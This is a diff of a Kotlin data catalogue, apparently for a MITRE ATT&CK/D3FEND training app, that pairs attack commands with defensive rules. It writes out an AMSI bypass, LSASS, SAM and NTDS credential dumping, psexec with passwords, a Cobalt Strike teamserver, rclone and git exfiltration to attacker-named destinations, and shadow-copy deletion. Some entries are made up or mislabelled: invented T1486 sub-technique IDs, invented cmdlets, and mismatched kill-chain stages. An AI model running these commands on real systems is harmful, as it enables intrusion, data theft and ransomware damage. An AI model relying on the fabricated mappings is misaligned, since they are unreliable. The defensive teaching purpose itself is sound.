-# Python script to XOR-encode malicious shellcode with dynamic key
-python3 -c 'key=0x5A; payload=open("shell.bin","rb").read(); open("enc.bin","wb").write(bytes([b^key for b in payload]))'
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(${null},${true})
             """.trimIndent(),
-            d3fendId = "D3-PSA",
-            d3fendName = "Process Memory Analysis & Heuristic Emulation",
-            d3fendDescription = "Enable EDR heuristic memory scanning to detect unmapped memory allocation, XOR decryption loops, and process hollowing.",
+            d3fendId = "D3-AMSI",
+            d3fendName = "AMSI Memory Integrity & Process Memory Scanning",
+            d3fendDescription = "Enable Hardware-Enforced Stack Protection (CET) and deploy EDR memory scanning for unbacked executable memory regions.",
             d3fendRuleOrFix = """
-# YARA Rule: Detect XOR Obfuscated Windows Shellcode Loops
-rule Detect_XOR_Shellcode {
-    strings:
-        ${'$'}xor_loop = { 80 34 ?? ?? 40 49 75 F7 }
-    condition:
-        ${'$'}xor_loop in (0..1024)
-}
+# Sysmon Config: Monitor AMSI Memory Patching & Remote Thread Injection
+<Sysmon schemaversion="4.90">
+  <EventFiltering>
+    <CreateRemoteThread onmatch="include">
+      <StartFunction condition="contains">AmsiScanBuffer</StartFunction>
+    </CreateRemoteThread>
+  </EventFiltering>
+</Sysmon>
             """.trimIndent(),
-            knownAptGroups = listOf("APT29", "Scattered Spider", "Sandworm"),
-            tags = listOf("Defense Evasion", "Obfuscation", "YARA", "EDR")
+            knownAptGroups = listOf("APT29", "FIN7", "Emotet"),
+            tags = listOf("DefenseEvasion", "AMSI", "Obfuscation", "MemoryPatch"),
+            nistControls = listOf(
+                NistControlMapping("SI-7", "Software, Firmware, and Information Integrity", "Protect (PR) / System Integrity", "Verify software execution integrity and monitor process memory modifications.", "Deploy Microsoft Defender EDR with AMSI Memory Tamper Protection enabled.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 4: Exploitation",
+                stageNumber = 4,
+                description = "Evading endpoint detection and antivirus telemetry during payload detonation.",
+                scenarioExample = "APT29 patched AMSI memory buffers in PowerShell processes before launching custom in-memory reconnaissance tools."
+            )
         ),
 
         // ==================== 8. CREDENTIAL ACCESS (TA0006) ====================
         MitreTtpItem(
-            techniqueId = "T1003.001",
+            techniqueId = "T1003",
             name = "OS Credential Dumping: LSASS Memory",
             tactic = MitreTactic.CREDENTIAL_ACCESS,
             subTechnique = "T1003.001",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1003.001", "LSASS Memory", "Dumping credentials directly from Local Security Authority Subsystem Service memory.", "procdump.exe -ma lsass.exe lsass.dmp"),
+                SubTechniqueItem("T1003.002", "Security Account Manager", "Extracting SAM registry hashes for local account offline cracking.", "reg save HKLM\\SAM sam.hive"),
+                SubTechniqueItem("T1003.003", "NTDS.dit", "Extracting Active Directory database files from Domain Controllers.", "ntdsutil 'ac i ntds' 'ifm' 'create full C:\\NTDS' q q")
+            ),
             description = "Adversaries dump process memory of the Local Security Authority Subsystem Service (LSASS) to harvest plaintext passwords, NTLM hashes, and Kerberos tickets.",
-            attackExampleTitle = "Mimikatz LSASS Process Memory Dump",
+            attackExampleTitle = "Mimikatz LSASS Process Dump & Sekurlsa Pass-the-Hash",
             attackCodeCommand = """
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
             """.trimIndent(),
-            d3fendId = "D3-CH",
-            d3fendName = "Credential Hardening & LSASS Protected Process Light (PPL)",
-            d3fendDescription = "Enable LSA Protection (RunAsPPL) and Microsoft Defender Credential Guard to isolate LSASS secrets in a Virtualization-Based Security (VBS) container.",
+            d3fendId = "D3-LSA",
+            d3fendName = "LSASS Process Protection & LSA Protected Mode (RunAsPPL)",
+            d3fendDescription = "Enable Windows Defender Credential Guard and enforce LSA Protection (RunAsPPL=1) to prevent unauthenticated handle opening to LSASS.",
             d3fendRuleOrFix = """
-# Enable LSASS PPL and Credential Guard via Registry
+# Enable LSA Protection (RunAsPPL) in Windows Registry
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
             """.trimIndent(),
-            knownAptGroups = listOf("Wizard Spider", "Lazarus Group", "FIN7"),
-            tags = listOf("Credential Access", "LSASS", "Mimikatz", "Credential Guard")
+            knownAptGroups = listOf("FIN6", "APT28", "Conti", "LockBit"),
+            tags = listOf("CredAccess", "LSASS", "Mimikatz", "NTLM", "RunAsPPL"),
+            nistControls = listOf(
+                NistControlMapping("IA-5", "Authenticator Management", "Protect (PR) / Identity", "Protect authenticators and password hashes stored in system memory from unauthenticated access.", "Enable Credential Guard and LSA Protected Mode (RunAsPPL) on all Windows hosts.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control",
+                stageNumber = 6,
+                description = "Harvesting high-privilege credentials to expand domain access and achieve domain admin privilege escalation.",
+                scenarioExample = "Conti ransomware affiliates dumped LSASS memory on local domain controllers using ProcDump to harvest Domain Admin NTLM hashes."
+            )
         ),
 
         // ==================== 9. DISCOVERY (TA0007) ====================
         MitreTtpItem(
-            techniqueId = "T1087.002",
-            name = "Account Discovery: Domain Account",
+            techniqueId = "T1087",
+            name = "Account Discovery: Domain Account Discovery",
             tactic = MitreTactic.DISCOVERY,
             subTechnique = "T1087.002",
-            description = "Adversaries query Active Directory LDAP interfaces or native net utilities to map domain user accounts, privileged admin groups, and enterprise domain architecture.",
-            attackExampleTitle = "Active Directory Domain Admin Enumeration via PowerView",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1087.001", "Local Account Discovery", "Querying local SAM accounts on victim workstation.", "net user"),
+                SubTechniqueItem("T1087.002", "Domain Account Discovery", "Querying Active Directory domain accounts and privilege groups via PowerView.", "Get-NetUser | Select-Object samaccountname,memberof")
+            ),
+            description = "Adversaries query Active Directory or local OS interfaces to identify user accounts, administrative groups, and domain privileges.",
+            attackExampleTitle = "PowerView & BloodHound Active Directory Domain Enumeration",
             attackCodeCommand = """
-# Querying Domain Admins and sensitive Service Principal Names (SPNs)
-Get-NetGroupMember -GroupName "Domain Admins" -FullData
-Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
+Get-NetUser -Unconstrained | select samaccountname,description
+sharpstat.exe --computername domain-controller-01 --check-admin
             """.trimIndent(),
-            d3fendId = "D3-DE",
-            d3fendName = "Decoy Environment & Honeytoken Account Auditing",
-            d3fendDescription = "Deploy decoy Active Directory accounts with canary credentials that trigger immediate high-severity SIEM alerts upon any LDAP enumeration query.",
+            d3fendId = "D3-ADC",
+            d3fendName = "Active Directory Query Auditing & Canary Honeytoken Accounts",
+            d3fendDescription = "Deploy Active Directory Canary Honeytoken accounts and alert on LDAP enumeration queries originating from standard workstations.",
             d3fendRuleOrFix = """
-# Defender for Identity / SIEM Detection for LDAP Mass Queries
-event.code: 4662 and object.type: "user" and user.name: "HoneyUserAdmin"
+# Active Directory Audit Policy: Enable Directory Service Access Auditing
+auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
             """.trimIndent(),
-            knownAptGroups = listOf("APT29", "FIN7", "Scattered Spider"),
-            tags = listOf("Discovery", "Active Directory", "PowerView", "LDAP")
+            knownAptGroups = listOf("APT29", "Wizard Spider", "FIN7"),
+            tags = listOf("Discovery", "ActiveDirectory", "PowerView", "BloodHound"),
+            nistControls = listOf(
+                NistControlMapping("AU-12", "Audit Generation", "Identify (ID) / Audit & Accountability", "Audit directory service queries and detect unusual mass LDAP requests.", "Enable Active Directory LDAP query logging and deploy Canary Account traps.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control",
+                stageNumber = 6,
+                description = "Mapping internal organizational account structures and domain administrator privileges.",
+                scenarioExample = "Wizard Spider executed BloodHound collectors to generate Active Directory path graphs identifying shortest routes to Domain Admin accounts."
+            )
         ),
 
         // ==================== 10. LATERAL MOVEMENT (TA0008) ====================
         MitreTtpItem(
-            techniqueId = "T1021.001",
-            name = "Remote Services: Remote Desktop Protocol (RDP)",
+            techniqueId = "T1021",
+            name = "Remote Services: SMB/Windows Admin Shares",
             tactic = MitreTactic.LATERAL_MOVEMENT,
-            subTechnique = "T1021.001",
-            description = "Adversaries abuse valid stolen credentials to connect via RDP to remote internal servers and pivot across workstations.",
-            attackExampleTitle = "Automated RDP Session Pivoting via xfreerdp with Saved Hashes",
+            subTechnique = "T1021.002",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1021.001", "Remote Desktop Protocol", "RDP lateral movement using stolen domain credentials.", "mstsc.exe /v:10.0.0.15"),
+                SubTechniqueItem("T1021.002", "SMB/Windows Admin Shares", "Executing commands across remote hosts via PsExec or SMB admin shares.", "psexec.exe \\\\10.0.0.15 -s cmd.exe"),
+                SubTechniqueItem("T1021.006", "Windows Remote Management", "Lateral movement via WinRM PowerShell remoting.", "Enter-PSSession -ComputerName Server01")
+            ),
+            description = "Adversaries abuse Server Message Block (SMB) file shares and Admin Shares (ADMINS, C$) to copy payload binaries and execute remote processes via RPC/PsExec.",
+            attackExampleTitle = "PsExec / Impacket psexec.py Remote Execution across Subnets",
             attackCodeCommand = """
-xfreerdp /v:10.0.1.50 /u:Administrator /pth:32b872d2fb46c2eee7714220b4109f52
+python3 psexec.py CORP.LOCAL/adminuser:'Password123!'@10.0.1.55 cmd.exe
+psexec.exe \\10.0.1.55 -u CORP\adminuser -p 'Password123!' -s cmd.exe
             """.trimIndent(),
-            d3fendId = "D3-DNSI",
-            d3fendName = "Dynamic Network Segment Isolation & Host Firewall Lockdown",
-            d3fendDescription = "Enforce Zero Trust microsegmentation, restricting RDP port 3389 exclusively to authenticated Privileged Access Workstations (PAWs).",
+            d3fendId = "D3-SMB",
+            d3fendName = "SMB Protocol Hardening & Network Micro-segmentation",
+            d3fendDescription = "Disable SMBv1, enforce SMB Signing, and restrict lateral SMB traffic between workstation subnets using host-based firewalls.",
             d3fendRuleOrFix = """
-# Windows Defender Firewall Rule: Restrict RDP port 3389 to PAW Subnet
-New-NetFirewallRule -Name "Restrict-RDP-PAW" -DisplayName "PAW Only RDP" \
-  -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.100.0/24 -Action Allow
+# Windows Firewall Rule: Block Inbound SMB (Port 445) Between Workstations
+New-NetFirewallRule -DisplayName "Block Workstation SMB Inbound" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block -RemoteAddress WorkstationSubnet
             """.trimIndent(),
-            knownAptGroups = listOf("BlackBasta", "LockBit", "Lazarus Group"),
-            tags = listOf("Lateral Movement", "RDP", "Pass-The-Hash", "Firewall")
+            knownAptGroups = listOf("FIN6", "NotPetya", "LockBit"),
+            tags = listOf("LateralMovement", "PsExec", "SMB", "AdminShares", "WinRM"),
+            nistControls = listOf(
+                NistControlMapping("SC-7", "Boundary Protection", "Protect (PR) / Communications", "Isolate workstation subnets and block lateral port 445/SMB traffic.", "Enforce Windows Host Firewall rules blocking peer-to-peer SMB connection attempts.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control",
+                stageNumber = 6,
+                description = "Pivoting across enterprise network subnets to reach target database servers and domain controllers.",
+                scenarioExample = "NotPetya malware propagated automatically across subnets using PsExec and stolen Administrator tokens via SMB shares."
+            )
         ),
 
         // ==================== 11. COLLECTION (TA0009) ====================
         MitreTtpItem(
-            techniqueId = "T1114.002",
-            name = "Email Collection: Email Forwarding Rule",
+            techniqueId = "T1560",
+            name = "Archive Collected Data: Archive via Utility",
             tactic = MitreTactic.COLLECTION,
-            subTechnique = "T1114.002",
-            description = "Adversaries create stealthy inbox forwarding rules in Microsoft 365 or Exchange to automatically mirror sensitive corporate emails to external attacker addresses.",
-            attackExampleTitle = "Creating Hidden Outlook Inbox Rule via PowerShell / Exchange API",
+            subTechnique = "T1560.001",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1560.001", "Archive via Utility", "Compressing targeted intellectual property into password-protected RAR or 7z archives.", "7z a -p'secret' exfil.7z C:\\SensitiveDocs\\*"),
+                SubTechniqueItem("T1560.002", "Archive via Library", "Utilizing built-in Python or PowerShell compression libraries.", "Compress-Archive -Path C:\\Docs -DestinationPath exfil.zip")
+            ),
+            description = "Adversaries compress and encrypt harvested sensitive documents, database dumps, and emails into password-protected archive files (ZIP, 7z, RAR) prior to exfiltration.",
+            attackExampleTitle = "Password-Protected 7-Zip Staging of Sensitive Corporate Files",
             attackCodeCommand = """
-New-InboxRule -Name "Invoice Forwarding" -User "cfo@company.com" \
-  -ForwardTo "exfil@attacker-domain.org" -DeleteMessage ${'$'}false
+7z.exe a -hp"CyberExfil2026!" -mhe=on C:\Users\Public\exfil_staging.7z C:\Share\Finance\* C:\Share\IP\*
             """.trimIndent(),
-            d3fendId = "D3-UBA",
-            d3fendName = "User Behavior Analytics & Mail Flow Monitoring",
-            d3fendDescription = "Block external inbox forwarding rules globally in M365 tenant settings and alert on rule additions.",
+            d3fendId = "D3-DLP",
+            d3fendName = "Data Loss Prevention (DLP) & File Archive Content Inspection",
+            d3fendDescription = "Deploy endpoint DLP controls to monitor creation of large encrypted archives in temp directories.",
             d3fendRuleOrFix = """
-# Exchange Online PowerShell: Disable Auto-Forwarding to External Domains
-Set-HostedOutboundSpamFilterPolicy -Identity Default \
-  -AutoForwardingMode Disable
+# Endpoint DLP Policy Rule: Alert on 7z / RAR archives created in Public directories > 50MB
+Set-DLPPolicy -Name "BlockEncryptedArchiveStaging" -MinSizeMB 50 -FileExtension "7z","rar" -Action AuditAndNotify
             """.trimIndent(),
-            knownAptGroups = listOf("Lapsus$", "Scattered Spider", "Kimsuky"),
-            tags = listOf("Collection", "Email", "M365", "Exchange")
+            knownAptGroups = listOf("Lazarus Group", "FIN7", "BlackCat"),
+            tags = listOf("Collection", "Archive", "7Zip", "Staging", "DLP"),
+            nistControls = listOf(
+                NistControlMapping("PR.DS-1", "Data Security", "Protect (PR) / Data Protection", "Implement Data Loss Prevention (DLP) controls to audit archive creation containing sensitive enterprise data.", "Configure Endpoint DLP alerts on 7z/RAR file staging exceeding 50MB.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 7: Actions on Objectives",
+                stageNumber = 7,
+                description = "Aggregating and compressing enterprise assets prior to external data exfiltration.",
+                scenarioExample = "BlackCat ransomware operators staged 100GB of confidential design files into password-protected 7z archives prior to exfiltration via Rclone."
+            )
         ),
 
-        // ==================== 12. COMMAND & CONTROL (TA0011) ====================
+        // ==================== 12. COMMAND AND CONTROL (TA0011) ====================
         MitreTtpItem(
-            techniqueId = "T1071.001",
-            name = "Application Layer Protocol: Web Protocols (HTTP/S C2)",
+            techniqueId = "T1071",
+            name = "Application Layer Protocol: Web Protocols",
             tactic = MitreTactic.COMMAND_AND_CONTROL,
             subTechnique = "T1071.001",
-            description = "Adversaries communicate with compromised implants using standard HTTP/HTTPS POST requests disguised as normal web browsing traffic to blend with corporate traffic.",
-            attackExampleTitle = "Sliver C2 HTTPS Beaconing with Malleable HTTP Profiles",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1071.001", "Web Protocols", "Tunneling C2 traffic over encrypted HTTPS requests.", "Cobalt Strike malleable C2 profile over HTTP/S"),
+                SubTechniqueItem("T1071.004", "DNS Protocols", "Exfiltrating data and receiving commands via DNS TXT query tunneling.", "dnscat2 / iodine DNS tunnel")
+            ),
+            description = "Adversaries communicate with compromised endpoints over standard HTTPS web traffic, hiding beaconing heartbeats inside standard HTTP GET/POST requests.",
+            attackExampleTitle = "Cobalt Strike Malleable C2 Beaconing over HTTPS",
             attackCodeCommand = """
-# Sliver HTTPS C2 beacon configuration string
-./sliver generate --http c2-cdn.cloudfront.net:443 --reconnect 10s --jitter 30s
+./teamserver 192.168.1.100 "SecretPass123" /opt/cobaltstrike/malleable_c2_jquery.profile
             """.trimIndent(),
-            d3fendId = "D3-NTA",
-            d3fendName = "Network Traffic Analysis & SSL/TLS Inspection",
-            d3fendDescription = "Deploy SSL/TLS deep packet inspection on edge proxies to inspect C2 HTTP payloads, dynamic headers, and anomalous user-agents.",
+            d3fendId = "D3-TLS",
+            d3fendName = "SSL/TLS Decryption & JA3/JA3S Fingerprint Inspection",
+            d3fendDescription = "Deploy outbound SSL Decryption proxies and inspect TLS Client Hello fingerprints (JA3) against known Cobalt Strike beacon signatures.",
             d3fendRuleOrFix = """
-# Suricata Intrusion Detection Signature for Sliver C2
-alert http ${'$'}HOME_NET any -> ${'$'}EXTERNAL_NET any (msg:"Sliver C2 HTTP Beacon Detected"; content:"POST"; http_method; content:"/api/v1/telemetry"; http_uri; sid:1000021;)
+# Suricata IDS Rule: Detect Cobalt Strike Default TLS JA3 Fingerprint
+alert tls ${'$'}HOME_NET any -> ${'$'}EXTERNAL_NET 443 (msg:"ET PRO CobaltStrike TLS JA3 Fingerprint Detected"; ja3.hash:"72a589da586844d7f0818ce684948eea"; sid:2030001; rev:1;)
             """.trimIndent(),
-            knownAptGroups = listOf("APT29", "Cobalt Group", "FIN7"),
-            tags = listOf("Command & Control", "HTTP", "HTTPS", "Suricata")
+            knownAptGroups = listOf("APT29", "FIN7", "Cobalt Group"),
+            tags = listOf("C2", "CobaltStrike", "HTTPS", "JA3", "Beaconing"),
+            nistControls = listOf(
+                NistControlMapping("SC-7", "Boundary Protection", "Protect (PR) / Communications", "Inspect encrypted egress communications for unauthorized C2 channels.", "Deploy TLS outbound decryption proxies with Suricata JA3 fingerprint matching.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control",
+                stageNumber = 6,
+                description = "Establishing persistent, encrypted command channels between victim host and remote adversary infrastructure.",
+                scenarioExample = "APT29 configured Cobalt Strike beacons with malleable HTTP profiles mimicking Google Analytics traffic to blend into corporate egress traffic."
+            )
         ),
 
         // ==================== 13. EXFILTRATION (TA0010) ====================
         MitreTtpItem(
-            techniqueId = "T1567.002",
-            name = "Exfiltration Over Web Service: Cloud Storage",
+            techniqueId = "T1567",
+            name = "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
             tactic = MitreTactic.EXFILTRATION,
             subTechnique = "T1567.002",
-            description = "Adversaries exfiltrate stolen database backups and corporate documents to public cloud storage providers (Rclone to Mega.nz, AWS S3, Google Drive).",
-            attackExampleTitle = "Automated Compressed Data Exfiltration via Rclone to Mega",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1567.001", "Exfiltration to Code Repository", "Uploading confidential source code to public GitHub repositories.", "git push https://github.com/attacker/stolen-code.git"),
+                SubTechniqueItem("T1567.002", "Exfiltration to Cloud Storage", "Transferring archived datasets to cloud buckets (AWS S3, Mega.nz, Dropbox) via Rclone.", "rclone copy C:\\exfil_staging.7z mega:stolen_data")
+            ),
+            description = "Adversaries transmit compressed archives to external cloud storage providers (Mega.nz, AWS S3, Google Drive) using automated utilities like Rclone.",
+            attackExampleTitle = "Rclone Data Exfiltration to Remote Mega.nz Cloud Account",
             attackCodeCommand = """
-rclone copy "C:\StagedData\company_secrets.7z" MegaRemote:ExfilBucket --transfers 8 --bwlimit 10M
+rclone.exe copy C:\Users\Public\exfil_staging.7z remote_mega:TargetExfilData --bwlimit 5M --transfers 4
             """.trimIndent(),
-            d3fendId = "D3-NTA",
-            d3fendName = "Data Loss Prevention (DLP) & Cloud Access Security Broker",
-            d3fendDescription = "Enforce CASB / SWG policies blocking unauthorized personal cloud storage uploads and alert on high-volume outbound data transfers.",
+            d3fendId = "D3-CASB",
+            d3fendName = "Cloud Access Security Broker (CASB) & Outbound Cloud Block",
+            d3fendDescription = "Enforce CASB cloud inline inspection to block unauthorized cloud API storage endpoints (Mega.nz, Dropbox, Personal S3).",
             d3fendRuleOrFix = """
-# Zscaler SWG Policy: Block Web Storage & File Transfer Category for Rclone user-agents
-Rule: Block Cloud Storage Uploads | Category: Cloud Storage | Action: Block
+# Zscaler SWG Policy: Block Unauthorized Cloud Storage Uploads
+Set-SWGPolicy -Category "Cloud Storage / File Host" -Action Block -AllowList "EnterpriseS3Bucket"
             """.trimIndent(),
-            knownAptGroups = listOf("LockBit", "BlackCat/ALPHV", "Akira"),
-            tags = listOf("Exfiltration", "Rclone", "CASB", "DLP")
+            knownAptGroups = listOf("Lazarus Group", "BlackCat", "LockBit"),
+            tags = listOf("Exfiltration", "Rclone", "CloudStorage", "Mega", "CASB"),
+            nistControls = listOf(
+                NistControlMapping("SC-28", "Protection of Information at Rest/Transit", "Protect (PR) / Data Security", "Restrict egress network bandwidth and prevent unauthorized transfers to unapproved cloud storage providers.", "Enforce CASB tenant isolation blocking non-corporate cloud storage endpoints.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 7: Actions on Objectives",
+                stageNumber = 7,
+                description = "Exfiltrating sensitive enterprise data to adversary-controlled cloud accounts.",
+                scenarioExample = "LockBit operators exfiltrated 500GB of proprietary engineering schematics to Mega.nz using Rclone prior to deploying ransomware encrypters."
+            )
         ),
 
         // ==================== 14. IMPACT (TA0040) ====================
         MitreTtpItem(
             techniqueId = "T1486",
-            name = "Data Encrypted for Impact (Ransomware)",
+            name = "Data Encrypted for Impact: Ransomware Execution",
             tactic = MitreTactic.IMPACT,
-            description = "Adversaries encrypt sensitive files on target endpoints and file shares using asymmetric encryption, rendering them inaccessible to extort ransom payments.",
-            attackExampleTitle = "High-Speed Multi-Threaded File Encryption",
+            subTechnique = "T1486",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1486.001", "Symmetric Encryption", "Encrypting files locally using AES-256 keys.", "LockBit ransomware encrypting local drives"),
+                SubTechniqueItem("T1486.002", "Volume Shadow Copy Deletion", "Destroying Windows VSS backup snapshots to prevent local recovery.", "vssadmin delete shadows /all /quiet")
+            ),
+            description = "Adversaries execute ransomware payloads to encrypt local files, volume shadow copies, and network shares, demanding ransom payments for decryption keys.",
+            attackExampleTitle = "VSS Snapshot Destruction & LockBit Ransomware Execution",
             attackCodeCommand = """
-taskkill /F /IM sqlservr.exe /IM backup.exe
 vssadmin.exe delete shadows /all /quiet
-ransom_payload.exe --threads 16 --dir "C:\Data"
+wbadmin.exe delete catalog -quiet
+wmic.exe shadowcopy delete
+LockBit.exe -pass "Key123" -m -g
             """.trimIndent(),
-            d3fendId = "D3-IRP",
-            d3fendName = "Immutable Remote Backups & Ransomware Defense",
-            d3fendDescription = "Maintain write-once-read-many (WORM) offline backups and configure canary files with automated endpoint isolation upon mass write spikes.",
+            d3fendId = "D3-RWD",
+            d3fendName = "Ransomware Behavioral Canary Protection & Anti-Ransomware Shield",
+            d3fendDescription = "Deploy EDR behavioral anti-ransomware rules that automatically freeze processes attempting mass file modification or VSS deletion.",
             d3fendRuleOrFix = """
-# Canary file watcher script in PowerShell
-${'$'}watcher = New-Object System.IO.FileSystemWatcher
-${'$'}watcher.Path = "C:\CanaryShare"
-${'$'}watcher.Filter = "*canary*"
-Register-ObjectEvent ${'$'}watcher "Changed" -Action {
-  Write-Warning "CRITICAL: Canary file altered! Initiating network isolation!"
-  Stop-Computer -Force
-}
+# Defender for Endpoint Attack Surface Reduction (ASR) Rule
+Set-MpPreference -AttackSurfaceReductionRules_Ids 92e5811a-6613-4225-a3a0-230f7f239980 -AttackSurfaceReductionRules_Actions Enabled
             """.trimIndent(),
-            knownAptGroups = listOf("LockBit 4.0", "Akira", "BlackCat/ALPHV"),
-            tags = listOf("Impact", "Ransomware", "Canary", "Encryption")
-        ),
-        MitreTtpItem(
-            techniqueId = "T1489",
-            name = "Service Stop: Inhibiting System Recovery",
-            tactic = MitreTactic.IMPACT,
-            description = "Adversaries stop or disable system services, such as Volume Shadow Copy, database engines, and antivirus, to prevent recovery or maximum disruption.",
-            attackExampleTitle = "Stopping Hyper-V and MSSQL Services via net stop",
-            attackCodeCommand = """
-net stop vmms /y
-net stop MSSQLSERVER /y
-net stop VeeamBackupSvc /y
-            """.trimIndent(),
-            d3fendId = "D3-PT",
-            d3fendName = "Service Protection & Anti-Tamper Isolation",
-            d3fendDescription = "Lock critical service permissions using SC sdset so standard administrator accounts cannot stop essential backup and hypervisor processes.",
-            d3fendRuleOrFix = """
-sc.exe sdset "VeeamBackupSvc" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
-            """.trimIndent(),
-            knownAptGroups = listOf("Ryuk", "BlackBasta", "Medusa"),
-            tags = listOf("Impact", "Service Stop", "Ransomware", "Backups")
+            knownAptGroups = listOf("LockBit", "Conti", "BlackCat", "REvil"),
+            tags = listOf("Impact", "Ransomware", "Encryption", "VSS", "LockBit"),
+            nistControls = listOf(
+                NistControlMapping("CP-9", "Information System Backups", "Recover (RC) / Contingency Planning", "Maintain immutable, air-gapped backups to restore operations after ransomware incidents.", "Deploy immutable AWS S3 Object Lock backups and offline tape storage.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 7: Actions on Objectives",
+                stageNumber = 7,
+                description = "Causing business disruption and financial damage through irreversible mass file encryption.",
+                scenarioExample = "LockBit ransomware encrypted over 2,000 servers within 30 minutes after destroying shadow copies via vssadmin."
+            )
         )
     )
 
-    /**
-     * Dedicated collection of authentic MITRE D3FEND defensive techniques categorized under the 6 D3FEND tactics.
-     */
     val allD3fendItems: List<MitreD3fendItem> = listOf(
-        // ==================== 1. MODEL ====================
+        // ==================== 1. MODEL (D3-TACTIC-MODEL) ====================
         MitreD3fendItem(
             d3fendId = "D3-AM",
-            name = "Asset Mapping & Cloud Discovery",
+            name = "Asset Mapping & Configuration Inventory",
             tactic = MitreDefendTactic.MODEL,
-            description = "Continuously catalog on-premise hardware, virtual machines, container workloads, and public cloud tenant resources to eliminate shadow IT.",
-            ruleOrFix = "aws configservice put-configuration-aggregator --configuration-aggregator-name CorpAggregator",
-            counteredAttackIds = listOf("T1595.002", "T1584.004"),
-            tags = listOf("Model", "Asset Mapping", "Cloud", "Inventory")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-DNSR",
-            name = "DNS Record Analysis & Split-Horizon DNS",
-            tactic = MitreDefendTactic.MODEL,
-            description = "Audit external DNS zones and Certificate Transparency logs while enforcing split-horizon DNS for non-public internal services.",
-            ruleOrFix = "aws route53 create-vpc-association-authorization --hosted-zone-id Z12345678 --vpc VPCRegion=us-east-1,VPCId=vpc-98765432",
-            counteredAttackIds = listOf("T1596.001"),
-            tags = listOf("Model", "DNS", "Certificate Transparency", "Split-Horizon")
+            description = "Continuously discover, catalog, and map enterprise hardware assets, cloud instances, and software dependencies.",
+            ruleOrFix = """
+# AWS Config Rule: Audit Unmapped / Untagged EC2 Instances
+{
+  "ConfigRuleName": "RequiredTagsCheck",
+  "Source": {
+    "Owner": "AWS",
+    "SourceIdentifier": "REQUIRED_TAGS"
+  }
+}
+            """.trimIndent(),
+            counteredAttackIds = listOf("T1595", "T1590"),
+            tags = listOf("Model", "AssetInventory", "AWSConfig"),
+            subTechniquesList = listOf(
+                SubTechniqueItem("D3-AM.1", "Host Discovery Mapping", "Automated network discovery mapping of active IPs.", "nmap -sn 10.0.0.0/16"),
+                SubTechniqueItem("D3-AM.2", "Software Inventory Verification", "Auditing installed software catalog against authorized baseline.", "Querying EDR software inventory database")
+            ),
+            nistControls = listOf(
+                NistControlMapping("ID.AM-1", "Asset Management", "Identify (ID) / Inventory", "Maintain an accurate inventory of physical devices and systems within the organization.", "Deploy automated cloud asset discovery via AWS Config and Microsoft Intune.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 1: Reconnaissance Defense",
+                stageNumber = 1,
+                description = "Denying adversary visibility into unmapped perimeter servers.",
+                scenarioExample = "Enterprise defenders utilized automated asset inventory tools to identify and decommission rogue development servers before adversaries discovered them."
+            )
         ),
 
-        // ==================== 2. HARDEN ====================
+        // ==================== 2. HARDEN (D3-TACTIC-HARDEN) ====================
         MitreD3fendItem(
-            d3fendId = "D3-EAL",
-            name = "Executable Allowed Listing (AppLocker / WDAC)",
+            d3fendId = "D3-LSA",
+            name = "LSASS Protection & LSA Protected Mode (RunAsPPL)",
             tactic = MitreDefendTactic.HARDEN,
-            description = "Enforce cryptographic publisher and hash allow-lists via Windows Defender Application Control to block unapproved binaries and C2 implants.",
-            ruleOrFix = "New-CIPolicy -Level Publisher -FilePath 'C:\\Rules\\WDAC.xml' -UserPEs",
-            counteredAttackIds = listOf("T1588.002", "T1190"),
-            tags = listOf("Harden", "AppLocker", "WDAC", "Application Control")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-MFA",
-            name = "Multi-Factor Authentication & FIDO2 Passkeys",
-            tactic = MitreDefendTactic.HARDEN,
-            description = "Mandate phishing-resistant FIDO2 hardware passkeys for all enterprise VPNs, M365 tenants, and single sign-on (SSO) gateways.",
-            ruleOrFix = "Set-MsolUser -UserPrincipalName 'admin@company.com' -StrongAuthenticationRequirements @()",
-            counteredAttackIds = listOf("T1566.001", "T1021.001"),
-            tags = listOf("Harden", "MFA", "FIDO2", "Passkeys", "SSO")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-CH",
-            name = "Credential Hardening & LSASS RunAsPPL",
-            tactic = MitreDefendTactic.HARDEN,
-            description = "Protect LSASS process memory with Virtualization-Based Security (VBS) and enable Credential Guard to prevent memory dumping.",
-            ruleOrFix = "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v RunAsPPL /t REG_DWORD /d 1 /f",
-            counteredAttackIds = listOf("T1003.001"),
